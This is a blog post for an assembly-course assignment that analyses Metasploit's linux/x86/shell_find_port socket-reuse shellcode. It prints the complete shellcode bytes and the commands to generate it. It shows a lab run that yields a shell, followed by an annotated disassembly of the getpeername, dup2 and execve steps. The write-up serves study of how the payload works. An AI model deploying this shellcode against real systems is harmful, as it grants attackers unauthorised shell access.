---
title:  "[SLAE 5] Metasploit Shell Find Port"
categories: [SLAE]
---

![Logo](/assets/images/tux-root.png)

## Metasploit shell_find_port shellcode analysis

This post is part of the 5th assignment of the [SLAE](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) course and will analyse a Metasploit socket reuse shellcode: _`linux/x86/shell_find_port`_.  I've started by analysing the following payload: 
```bash
# msfpayload linux/x86/shell_find_port S
 
       Name: Linux Command Shell, Find Port Inline
     Module: payload/linux/x86/shell_find_port
    Version: 0
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 169
       Rank: Normal
 
Provided by:
  Ramon de C Valle <rcvalle metasploit.com>
 
Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
CPORT  60957            no        The local client port
 
Description:
  Spawn a shell on an established connection
```

So this is actually a **_port reuse shellcode_**: it will search for an already established connection (based on the local client port specified in CPORT variable) and spawn a shell over that connection. Nice! There is a great description of how this payload functions at [BlackHatLibrary](http://www.blackhatlibrary.net/Shellcode/Socket-reuse).

To test this payload we'll need:
* A server that listens for connections and also executes payloads 
* A client that will establish a connection with the server from a fixed local port, then send our metasploit shellcode.

We'll use the [socket-loader.c](http://www.blackhatlibrary.net/Shellcode/Appendix#socket-loader.c) and [socket-reuse-send.c](http://www.blackhatlibrary.net/Shellcode/Appendix#socket-reuse-send.c) from BlackhatLibrary. We'll first compile and start the server: 

```bash
$ gcc -Wall -o socket-loader socket-loader.c 
$ ./socket-loader 7001
```
 
Then generate the metasploit payload and integrate it into the socket-reuse-send source file: 
```bash
# msfpayload linux/x86/shell_find_port CPORT=4444 C
/*
 * linux/x86/shell_find_port - 62 bytes
 * http://www.metasploit.com
 * VERBOSE=false, CPORT=4444, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, InitialAutoRunScript=, AutoRunScript=
 */
unsigned char buf[] = 
"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff"
"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x11\x5c\x75\xf1\x5b"
"\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80";
 
# gcc -Wall -o socket-reuse-send socket-reuse-send.c 
```

The syntax for client is as follows:
```bash
./socket-reuse-send <server_ip> <server_port> <client_ip> <local_client_port>
```

So the next line will connect to the server listening on port 7001 and send the payload generated earlier from the local port 4444. The payload will then be executed by the server and we'll get a shell: 

```bash
# ./socket-reuse-send 192.168.56.1 7001 192.168.56.101 4444
 [*] Connecting to 192.168.56.1
 [*] Sending payload
whoami
liv
```

So the payload is working as expected, now onto analysis. We'll first try to use the __*`sctest`*__ binary from __*`libemu`*__: 
```
# msfpayload linux/x86/shell_find_port CPORT=4444 R > shellcode.bin
$ cat shellcode.bin | /opt/libemu/bin/sctest -vvv -S -s 1000 -G shellcode.dot
$ dot shellcode.dot -T png -o shellcode.png
```

[![](/assets/images/libemu-small.png)](/assets/images/libemu.png)

This way we can get a feeling about how this shellcode is functioning. As we'll see later, there is a final piece missing from the picture, because the sctest emulator is not leaving the loop (marked with red arrows). We'll use a disassembler to examine all the instructions: 
```bash
$ echo -ne "\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x11\x5c\x75\xf1\x5b\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" | ndisasm -b 32 -
```

First operation done by a server is, as seen in the picture, to execute _`getpeername`_ in a loop. This will try to obtain information about a peer connected to a specific file descriptor. 
```c
int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
00000000  31DB              xor ebx,ebx
00000002  53                push ebx
00000003  89E7              mov edi,esp
00000005  6A10              push byte +0x10     ;  addrlen
00000007  54                push esp            ; *addrlen
00000008  57                push edi            ; *addr
00000009  53                push ebx            ; sockfd to search
0000000A  89E1              mov ecx,esp
0000000C  B307              mov bl,0x7          ; int call - SYS_GETPEERNAME (7)
getpeername_loop:
0000000E  FF01              inc dword [ecx]     ; increment fd to be checked
00000010  6A66              push byte +0x66     ; sys_socketcall
00000012  58                pop eax
00000013  CD80              int 0x80
```

The next part checks for a specific condition for any file descriptor found: it will verify the source port and if it's different than 4444 we'll increment the file descriptor and re-execute the loop: 
```c
; 115c(hex) = 4444 (dec)
; compare port
; struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET, AF_INET6
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};
00000015  66817F02115C      cmp word [edi+0x2],0x5c11
; if not, jump to getpeername_loop
0000001B  75F1              jnz 0xe
```

In case a connection was found with the source port equal to 4444, it will execute in a loop 3 _`dup2`_ calls, and duplicate stdin, stdout and stderr to the found file descriptor: 
```c
0000001D  5B                pop ebx         ; old fd parameter;  
0000001E  6A02              push byte +0x2  ; 
00000020  59                pop ecx         ; new fd
dup2_loop:
00000021  B03F              mov al,0x3f     ; sys_dup2 syscall
00000023  CD80              int 0x80
00000025  49                dec ecx
00000026  79F9              jns 0x21        ; if not -1, jump to dup2_loop label
The final piece of the shellcode executes /bin/sh: 
00000028  50                push eax
00000029  682F2F7368        push dword 0x68732f2f   ; 'hs//'
0000002E  682F62696E        push dword 0x6e69622f   ; 'nib/'
00000033  89E3              mov ebx,esp     ; '/bin/sh\x00'
00000035  50                push eax
00000036  53                push ebx
00000037  89E1              mov ecx,esp     ; address of the parameters array
00000039  99                cdq
0000003A  B00B              mov al,0xb      ; sys_execve
0000003C  CD80              int 0x80
```

##

The complete source files and scripts mentioned in this post can be found in my [SLAE Git repository](https://github.com/livz/slae).

**_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)_**
